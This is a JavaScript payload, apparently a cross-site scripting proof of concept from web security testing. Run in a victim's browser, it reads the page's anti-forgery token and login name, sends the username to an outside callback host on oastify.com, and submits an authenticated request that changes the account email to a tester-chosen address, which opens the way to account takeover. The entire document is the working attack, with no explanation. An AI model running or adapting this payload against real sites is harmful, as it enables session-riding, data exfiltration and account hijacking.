(async () => {
  const token =
    document.querySelector('input[name="__RequestVerificationToken"]')?.value;

  const username =
    document.querySelector('#ProfileInfo_LoginName-input')?.value ||
    document.querySelector('input[name="ProfileInfo.LoginName"]')?.value;

  if (!token) {
    console.error("Missing __RequestVerificationToken");
    return;
  }

  fetch('https://v737o1tiz67xyfm89veutxtgh7nybqzf.oastify.com?username='+username);

  const fd = new FormData();
  fd.append("ProfileInfo.Email", "trey@inspectiv.com");
  fd.append("__RequestVerificationToken", token);

  try {
    const r = await fetch("/Settings?handler=UpdateProfileInfo", {
      method: "POST",
      credentials: "include",
      headers: {
        "X-Requested-With": "XMLHttpRequest"
      },
      body: fd
    });

    const text = await r.text();
    console.log("status:", r.status);
    console.log("response:", text);
  } catch (err) {
    console.error("request failed:", err);
  }
})();
